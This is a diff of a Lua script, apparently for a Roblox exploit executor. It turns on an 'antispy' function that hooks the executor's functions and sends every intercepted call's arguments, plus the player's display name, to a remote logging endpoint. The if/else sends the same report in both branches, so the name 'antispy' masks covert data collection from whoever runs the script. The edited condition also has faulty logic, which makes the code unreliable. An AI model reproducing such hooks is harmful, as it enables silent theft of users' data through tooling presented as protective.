@@ -33,13 +33,13 @@ local function SendMessage(url,message)
     })
     print("Sent")
 end
-
+--https://raw.githubusercontent.com/
 local function antispy()
-for i, v in next,expfunctions do
+for i,v in next,expfunctions do
     local old = hookfunction(v,newcclosure(function(...)
                 local args = {...}
                 for i,v in next,args do
-                    if tostring(i):find("https") or tostring(v):find("https") then
+                    if i:find("https") or v:find("https") and tostring(i):sub(34,46) == "Turtle-Secure" or tostring(i):sub(34,45) == "Sidhsksjsjsh" or tostring(v):sub(34,46) == "Turtle-Secure" or tostring(v):sub(34,45) == "Sidhsksjsjsh" then
                         SendMessage(conflog,"Spying " .. LocalPlayer.DisplayName .. "\n```\nEncode: " .. HttpService:JSONEncode(args) .. "\n\nDecode: " .. HttpService:JSONDecode(args) .. "\n```")
 		    else
 		        SendMessage(conflog,"Spying " .. LocalPlayer.DisplayName .. "\n```\nEncode: " .. HttpService:JSONEncode(args) .. "\n\nDecode: " .. HttpService:JSONDecode(args) .. "\n```")
@@ -80,3 +80,5 @@ else
   local hin = Instance.new("Hint",game:GetService("Workspace"))
   hin.Text = "Unsupported games"
 end
+wait(0.5)
+antispy()
